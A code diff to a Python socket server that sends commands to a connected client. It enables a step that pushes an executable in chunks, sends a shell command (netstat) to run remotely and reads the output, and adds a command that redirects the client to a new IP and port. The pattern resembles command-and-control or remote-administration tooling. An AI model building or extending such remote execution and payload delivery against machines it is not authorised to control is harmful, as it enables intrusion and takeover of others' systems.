@@ -13,6 +13,8 @@ import socket
 
 FILE_PATH = "C:\\Users\\admin\\Downloads\\calc.exe"
 EXE_STR = "netstat -a -n -o"
+NEW_IP = "10.7.0.89"
+NEW_PORT = 4000
 CHUNK_SIZE = 1024
 
 
@@ -47,16 +49,16 @@ if __name__ == '__main__':
         conn.send(data)
         data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
-        # # UPDATE:
-        # conn.send("UPDATE".encode())
-        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
-        # for chunk in bin_file_to_buffer(FILE_PATH):
-        #     packet = chunk
-        #     print(packet)
-        #     conn.send(packet)
-        #     data = conn.recv(BUFFER_SIZE)  # ok for packgae
-        # conn.send("END_UPDATE".encode())
-        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
+        # UPDATE:
+        conn.send("UPDATE".encode())
+        data = conn.recv(BUFFER_SIZE)  # ok for packgae
+        for chunk in bin_file_to_buffer(FILE_PATH):
+            packet = chunk
+            print(packet)
+            conn.send(packet)
+            data = conn.recv(BUFFER_SIZE)  # ok for packgae
+        conn.send("END_UPDATE".encode())
+        data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
         # Execute
         conn.send("EXECUTE".encode())
@@ -65,11 +67,21 @@ if __name__ == '__main__':
         conn.send(packet.encode())
         data = conn.recv(2)  # ok for packgae
         # get response
-        data = conn.recv(BUFFER_SIZE*100)
+        data = conn.recv(BUFFER_SIZE * 100)
         conn.send("OK".encode())
         print("hsgfasygdfjksd")
-        print(data.decode())#TODO handle /n
+        print(data.decode())  # TODO handle /n
         conn.send("END_EXECUTE".encode())
         data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
-    conn.close()
+        # Change IP
+        conn.send("CHANGE_IP".encode())
+        data = conn.recv(2)  # ok for packgae
+        # send size of packet
+        packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
+        conn.send(str(len(packet_str)).encode())
+        data = conn.recv(2)  # ok for packgae
+        conn.send(packet_str.encode())
+        data = conn.recv(2)  # ok for packgae
+
+conn.close()
